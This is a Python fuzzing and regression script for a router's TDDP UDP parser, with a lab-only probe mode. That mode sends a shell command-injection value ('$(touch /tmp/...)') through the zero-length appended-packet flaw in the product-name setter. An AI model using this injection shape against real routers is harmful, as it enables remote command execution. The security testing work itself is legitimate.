#!/usr/bin/env python3
"""Bounded, loopback-default TDDP parser regression driver.

This deliberately avoids known factory-reset/reboot command payloads. It
mutates header dispatch and declared/actual length boundaries, then reports
responses; the surrounding isolated harness is responsible for process-health
checks.
"""

from __future__ import annotations

import argparse
import hashlib
import ipaddress
import socket
import struct


BOUNDARIES = (0, 1, 7, 8, 15, 16, 27, 28, 31, 32, 63, 64, 255, 256,
              1023, 1024, 2047, 2048, 4095, 4096, 0x13FFF, 0x14000,
              0x14001, 0x1000000, 0x7FFFFFFF, 0xFFFFFFFF)


def header(version: int, kind: int, subtype: int, declared: int, payload: bytes) -> bytes:
    prefix = struct.pack(">BBBBIHBB", version, kind, 1, 0, declared, 0x4652, subtype, 0)
    # The receiver hashes the declared packet extent. Bytes appended beyond a
    # zero declared length are the regression condition under test.
    unsigned = prefix + (b"\0" * 16) + payload[:declared]
    digest = hashlib.md5(unsigned).digest()
    return prefix + digest + payload


def cases() -> list[tuple[str, bytes]]:
    result: list[tuple[str, bytes]] = []
    patterns = (b"", b"A", b"A" * 8, b"A" * 32, bytes(range(256)), b"A" * 4096)
    for version in (1, 2, 0, 3, 0xFF):
        for kind in (0, 1, 2, 3, 4, 6, 7, 0x0C, 0x0D, 0x31, 0x7F, 0xFF):
            for subtype in (0, 1, 2, 3, 0x20, 0x40, 0x48, 0x4B, 0x7F, 0xFF):
                payload = patterns[(version + kind + subtype) % len(patterns)]
                result.append((f"dispatch-v{version:02x}-t{kind:02x}-s{subtype:02x}",
                               header(version, kind, subtype, len(payload), payload)))
    for declared in BOUNDARIES:
        for actual in (0, 1, 7, 8, 16, 32, 256, 4096):
            payload = b"B" * actual
            result.append((f"length-d{declared:08x}-a{actual}",
                           header(2, 7, 0, declared, payload)))
    return result


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=1040)
    parser.add_argument("--timeout", type=float, default=0.02)
    parser.add_argument("--allow-non-loopback", action="store_true")
    parser.add_argument("--marker-probe", action="store_true",
                        help="send one fixed, lab-only command-flow marker probe")
    parser.add_argument("--read-probe", action="store_true",
                        help="send the public zero-length shape with a read-only sub-command")
    parser.add_argument("--offset-sweep", action="store_true",
                        help="try benign product-name command-byte offsets 0..29")
    parser.add_argument("--c5400x-read-sweep", action="store_true",
                        help="try read-only C5400X product-ID command 0x0a at offsets 0..63")
    parser.add_argument("--command-offset", type=int,
                        help="send one benign product-name probe at this byte offset")
    args = parser.parse_args()
    if not args.allow_non_loopback and not ipaddress.ip_address(args.host).is_loopback:
        parser.error("non-loopback targets require --allow-non-loopback")

    selected = cases()
    if args.command_offset is not None:
        if not 0 <= args.command_offset < 30:
            parser.error("--command-offset must be between 0 and 29")
        inner = bytearray(30)
        inner[args.command_offset] = 0x52
        inner += b"FRIDAY"
        selected = [(f"benign-product-name-offset-{args.command_offset}",
                     header(2, 7, 0, 0, bytes(inner)))]
    elif args.c5400x_read_sweep:
        # recvfrom stores incoming byte 0 at the daemon's internal +0x1b.
        # Consequently internal packet type +0x1c is outer byte 1 and the
        # special command at +0x25 is outer byte 10 (the subtype argument).
        # This list deliberately contains getters only.
        read_commands = (0x0A, 0x35, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x40, 0x42)
        selected = [
            (f"c5400x-read-command-{command:02x}",
             header(2, 3, command, 0, b""))
            for command in read_commands
        ]
    elif args.offset_sweep:
        selected = []
        for offset in range(30):
            inner = bytearray(30)
            inner[offset] = 0x52
            inner += b"FRIDAY"
            selected.append((f"benign-product-name-offset-{offset}",
                             header(2, 7, 0, 0, bytes(inner))))
    elif args.marker_probe:
        # The public zero-length regression maps appended bytes onto the
        # decrypted packet buffer. Sub-command 0x52 selects the product-name
        # setter in the audited AX21 build. The fixed effect stays under /tmp.
        # This ARM implementation places the appended inner packet two bytes
        # after the layout used by the original C20 proof.
        inner = bytearray(30)
        inner[12] = 0x52
        inner += b"X$(touch /tmp/FRIDAY_TDDP_MARKER)"
        selected = [("fixed-product-name-marker", header(2, 7, 0, 0, bytes(inner)))]
    elif args.read_probe:
        inner = (b"\0" * 10) + b"\x45" + (b"\0" * 4)
        selected = [("zero-length-read-only-45", header(2, 7, 0, 0, inner))]

    sent = responses = errors = 0
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.bind(("127.0.0.1", 0))
        sock.settimeout(args.timeout)
        for name, packet in selected:
            try:
                sock.sendto(packet, (args.host, args.port))
                sent += 1
                try:
                    data, _ = sock.recvfrom(8192)
                    responses += 1
                    suffix = (f" hex={data.hex()}" if
                              (args.marker_probe or args.read_probe or args.offset_sweep or
                               args.c5400x_read_sweep or
                               args.command_offset is not None) else "")
                    print(f"response {name} bytes={len(data)}{suffix}")
                except socket.timeout:
                    pass
            except OSError as exc:
                errors += 1
                print(f"send-error {name}: {exc}")
    print(f"summary sent={sent} responses={responses} errors={errors}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
